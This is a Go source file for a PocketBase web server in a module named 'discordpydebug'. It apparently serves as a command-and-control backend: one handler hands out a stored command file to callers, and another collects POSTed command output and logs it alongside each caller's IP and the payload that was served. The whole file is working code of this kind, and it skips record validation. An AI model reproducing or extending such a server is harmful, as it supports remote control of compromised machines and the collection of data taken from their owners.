package webserver

import (
	"discordpydebug/internal/file"
	"errors"
	"io"
	"net/http"
	"net/url"
	"strings"

	"github.com/pocketbase/pocketbase"
	"github.com/pocketbase/pocketbase/core"
)

func commmand(e *core.RequestEvent) error {
	return e.String(http.StatusOK, string(file.ReadFile()))
}

func uploadHandler(e *core.RequestEvent, baseapp *pocketbase.PocketBase) error {
	ip := e.RealIP() // default fallback to e.RemoteIP() if no trusted proxy set in pocketbase

	body, err := io.ReadAll(e.Request.Body)
	if err != nil {
		return ThrowError(err, e)
	}
	defer e.Request.Body.Close()

	data := make(map[string]string)
	pairs := strings.Split(string(body), "&")

	for _, pair := range pairs {
		kv := strings.Split(pair, "=")
		if len(kv) == 2 {
			data[kv[0]] = kv[1]
		}
	}

	outputValue, exists := data["output"]
	if !exists {
		return nil
	}

	if outputValue == "" {
		return nil
	}

	outputValue, err = url.QueryUnescape(outputValue)
	if err != nil {
		return ThrowError(errors.New("url error"), e)
	}

	collection, err := baseapp.FindCachedCollectionByNameOrId("output_log")
	if err != nil {
		return ThrowError(err, e)
	}

	record := core.NewRecord(collection)
	record.Set("IP", ip)
	record.Set("Payload", file.ReadFile())
	record.Set("Output", outputValue)
	err = baseapp.SaveNoValidate(record)
	if err != nil {
		return ThrowError(err, e)
	}

	e.String(http.StatusOK, "done")
	return nil
}
